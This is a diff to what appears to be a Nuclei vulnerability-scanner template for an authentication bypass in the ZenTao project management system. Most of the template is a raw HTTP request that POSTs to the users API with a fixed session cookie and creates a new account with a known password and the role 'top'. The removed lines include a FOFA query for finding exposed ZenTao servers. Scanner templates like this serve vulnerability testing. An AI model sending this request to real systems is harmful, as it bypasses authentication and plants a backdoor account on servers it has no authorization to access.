@@ -3,20 +3,14 @@ info:
   name: 禅道项目管理系统 身份认证绕过
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cx3xg2nkfyoc6eba'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cx3xg2nkfyoc6eba
-    fofa: app="易软天创-禅道系统"
 http:
 - raw:
   - 'POST /api.php/v1/users HTTP/1.1
 
 
     Cookie: zentaosid=06cc7df8420574cf12a403d16cf3f5d9;
-
-
 
 
     {"account": "dudesite", "password": "dudesite123", "realname": "xiaoming", "role": "top", "group": "1"}
